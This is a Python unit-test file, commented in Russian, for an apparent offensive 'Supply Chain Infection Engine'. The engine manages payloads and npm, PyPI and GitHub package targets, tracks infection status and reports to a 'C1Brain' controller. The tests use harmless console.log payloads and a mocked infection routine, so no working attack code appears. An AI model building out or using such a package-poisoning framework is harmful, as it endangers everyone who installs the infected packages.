#!/usr/bin/env python3
"""
Тесты для модуля Supply Chain Infection Engine
"""

import os
import json
import unittest
from unittest.mock import patch, MagicMock, mock_open
import tempfile
import time
from typing import Dict, Any, List

from src.supply_chain.engine import (
    SupplyChainEngine,
    SupplyChainTarget,
    Payload,
    TargetType,
    InfectionStatus
)

class TestSupplyChainEngine(unittest.TestCase):
    """Тесты для SupplyChainEngine"""
    
    def setUp(self):
        """Настройка перед каждым тестом"""
        # Используем временный файл для хранения данных
        self.temp_file = tempfile.NamedTemporaryFile(delete=False)
        self.temp_filename = self.temp_file.name
        self.temp_file.close()
        
        # Создаем мок для C1Brain
        self.mock_brain = MagicMock()
        
        # Создаем экземпляр SupplyChainEngine
        self.engine = SupplyChainEngine(
            brain=self.mock_brain,
            storage_file=self.temp_filename,
            scan_interval=1,  # Для быстрых тестов
            auto_scan=False   # Отключаем автосканирование для тестов
        )
        
        # Создаем тестовые данные
        self._create_test_data()
    
    def tearDown(self):
        """Очистка после каждого теста"""
        # Останавливаем движок
        if self.engine.running:
            self.engine.stop()
        
        # Удаляем временный файл
        try:
            os.unlink(self.temp_filename)
        except:
            pass
    
    def _create_test_data(self):
        """Создает тестовые данные: цели и payload"""
        # Создаем тестовый payload
        self.test_payload = Payload(
            payload_id="test-payload-id",
            name="Test Payload",
            description="Тестовый payload для проверки функциональности",
            target_types=[TargetType.NPM, TargetType.PYPI],
            code="console.log('Test payload executed')",
            file_path=None,
            is_active=True,
            metadata={"version": "1.0.0", "author": "Tester"}
        )
        
        # Создаем тестовую цель NPM
        self.test_npm_target = SupplyChainTarget(
            target_id="test-npm-target-id",
            target_type=TargetType.NPM,
            target_data={
                "name": "test-package",
                "version": "1.0.0",
                "repository": "https://github.com/test/test-package"
            },
            status=InfectionStatus.PENDING
        )
        
        # Создаем тестовую цель PyPI
        self.test_pypi_target = SupplyChainTarget(
            target_id="test-pypi-target-id",
            target_type=TargetType.PYPI,
            target_data={
                "name": "test-package",
                "version": "1.0.0",
                "repository": "https://github.com/test/test-package"
            },
            status=InfectionStatus.PENDING
        )
    
    def test_init(self):
        """Тест инициализации SupplyChainEngine"""
        self.assertEqual(self.engine.brain, self.mock_brain)
        self.assertEqual(self.engine.storage_file, self.temp_filename)
        self.assertEqual(self.engine.scan_interval, 1)
        self.assertFalse(self.engine.auto_scan)
        self.assertFalse(self.engine.running)
        self.assertEqual(len(self.engine.targets), 0)
        self.assertEqual(len(self.engine.payloads), 0)
    
    def test_set_brain(self):
        """Тест установки C1Brain"""
        new_brain = MagicMock()
        self.engine.set_brain(new_brain)
        self.assertEqual(self.engine.brain, new_brain)
    
    def test_start_stop(self):
        """Тест запуска и остановки SupplyChainEngine"""
        # Запускаем движок
        self.engine.start()
        self.assertTrue(self.engine.running)
        
        # Останавливаем движок
        self.engine.stop()
        self.assertFalse(self.engine.running)
    
    def test_add_payload(self):
        """Тест добавления payload"""
        # Добавляем тестовый payload
        self.engine.add_payload(self.test_payload)
        
        # Проверяем, что payload добавлен
        self.assertEqual(len(self.engine.payloads), 1)
        self.assertIn(self.test_payload.payload_id, self.engine.payloads)
        self.assertEqual(self.engine.payloads[self.test_payload.payload_id], self.test_payload)
        
        # Проверяем получение payload по ID
        payload = self.engine.get_payload(self.test_payload.payload_id)
        self.assertEqual(payload, self.test_payload)
        
        # Проверяем получение всех payloads
        payloads = self.engine.get_all_payloads()
        self.assertEqual(len(payloads), 1)
        self.assertIn(self.test_payload.payload_id, payloads)
    
    def test_add_target(self):
        """Тест добавления цели"""
        # Добавляем тестовую цель
        self.engine.add_target(self.test_npm_target)
        
        # Проверяем, что цель добавлена
        self.assertEqual(len(self.engine.targets), 1)
        self.assertIn(self.test_npm_target.target_id, self.engine.targets)
        self.assertEqual(self.engine.targets[self.test_npm_target.target_id], self.test_npm_target)
        
        # Проверяем получение цели по ID
        target = self.engine.get_target(self.test_npm_target.target_id)
        self.assertEqual(target, self.test_npm_target)
        
        # Проверяем получение всех целей
        targets = self.engine.get_all_targets()
        self.assertEqual(len(targets), 1)
        self.assertIn(self.test_npm_target.target_id, targets)
    
    def test_save_load_data(self):
        """Тест сохранения и загрузки данных"""
        # Добавляем тестовые данные
        self.engine.add_payload(self.test_payload)
        self.engine.add_target(self.test_npm_target)
        
        # Вызываем сохранение данных
        self.engine._save_data()
        
        # Создаем новый экземпляр движка с тем же файлом хранения
        new_engine = SupplyChainEngine(
            storage_file=self.temp_filename,
            auto_scan=False
        )
        
        # Проверяем, что данные загружены
        self.assertEqual(len(new_engine.payloads), 1)
        self.assertEqual(len(new_engine.targets), 1)
        self.assertIn(self.test_payload.payload_id, new_engine.payloads)
        self.assertIn(self.test_npm_target.target_id, new_engine.targets)
    
    @patch('src.supply_chain.engine.SupplyChainEngine._infect_npm_package')
    def test_infect_target(self, mock_infect_npm):
        """Тест заражения цели"""
        # Настраиваем мок для возврата успешного результата
        mock_infect_npm.return_value = True
        
        # Добавляем тестовые данные
        self.engine.add_payload(self.test_payload)
        self.engine.add_target(self.test_npm_target)
        
        # Заражаем цель
        result = self.engine.infect_target(
            self.test_npm_target.target_id, 
            self.test_payload.payload_id
        )
        
        # Проверяем результат
        self.assertTrue(result)
        mock_infect_npm.assert_called_once()
        
        # Проверяем, что статус цели обновлен
        target = self.engine.get_target(self.test_npm_target.target_id)
        self.assertEqual(target.status, InfectionStatus.COMPLETED)
        self.assertEqual(target.payload_id, self.test_payload.payload_id)
    
    def test_infect_target_invalid_combination(self):
        """Тест заражения цели с несовместимым payload"""
        # Создаем payload только для GitHub
        github_payload = Payload(
            payload_id="github-payload-id",
            name="GitHub Payload",
            description="Payload только для GitHub",
            target_types=[TargetType.GITHUB],
            code="console.log('GitHub payload')"
        )
        
        # Добавляем тестовые данные
        self.engine.add_payload(github_payload)
        self.engine.add_target(self.test_npm_target)
        
        # Пытаемся заразить NPM цель GitHub payload
        result = self.engine.infect_target(
            self.test_npm_target.target_id, 
            github_payload.payload_id
        )
        
        # Проверяем результат
        self.assertFalse(result)
        
        # Проверяем, что статус цели не изменился
        target = self.engine.get_target(self.test_npm_target.target_id)
        self.assertEqual(target.status, InfectionStatus.PENDING)
    
    def test_update_target_status(self):
        """Тест обновления статуса цели"""
        # Добавляем тестовую цель
        self.engine.add_target(self.test_npm_target)
        
        # Получаем цель и обновляем статус
        target = self.engine.get_target(self.test_npm_target.target_id)
        target.update_status(InfectionStatus.SCANNING)
        
        # Проверяем, что статус обновлен
        self.assertEqual(target.status, InfectionStatus.SCANNING)
        
        # Обновляем до COMPLETED и проверяем, что дата заражения установлена
        target.update_status(InfectionStatus.COMPLETED)
        self.assertEqual(target.status, InfectionStatus.COMPLETED)
        self.assertIsNotNone(target.infection_date)
    
    def test_payload_serialization(self):
        """Тест сериализации и десериализации payload"""
        # Сериализуем payload
        payload_dict = self.test_payload.to_dict()
        
        # Проверяем структуру словаря
        self.assertEqual(payload_dict["payload_id"], self.test_payload.payload_id)
        self.assertEqual(payload_dict["name"], self.test_payload.name)
        self.assertEqual(payload_dict["description"], self.test_payload.description)
        self.assertEqual(payload_dict["code"], self.test_payload.code)
        self.assertEqual(payload_dict["target_types"], ["npm", "pypi"])
        
        # Десериализуем обратно
        restored_payload = Payload.from_dict(payload_dict)
        
        # Проверяем восстановленный объект
        self.assertEqual(restored_payload.payload_id, self.test_payload.payload_id)
        self.assertEqual(restored_payload.name, self.test_payload.name)
        self.assertEqual(restored_payload.description, self.test_payload.description)
        self.assertEqual(restored_payload.code, self.test_payload.code)
        self.assertEqual(
            [t.value for t in restored_payload.target_types], 
            [t.value for t in self.test_payload.target_types]
        )
    
    def test_target_serialization(self):
        """Тест сериализации и десериализации цели"""
        # Сериализуем цель
        target_dict = self.test_npm_target.to_dict()
        
        # Проверяем структуру словаря
        self.assertEqual(target_dict["target_id"], self.test_npm_target.target_id)
        self.assertEqual(target_dict["target_type"], self.test_npm_target.target_type.value)
        self.assertEqual(target_dict["status"], self.test_npm_target.status.value)
        
        # Десериализуем обратно
        restored_target = SupplyChainTarget.from_dict(target_dict)
        
        # Проверяем восстановленный объект
        self.assertEqual(restored_target.target_id, self.test_npm_target.target_id)
        self.assertEqual(restored_target.target_type, self.test_npm_target.target_type)
        self.assertEqual(restored_target.status, self.test_npm_target.status)
        self.assertEqual(restored_target.target_data, self.test_npm_target.target_data)

if __name__ == '__main__':
    unittest.main() 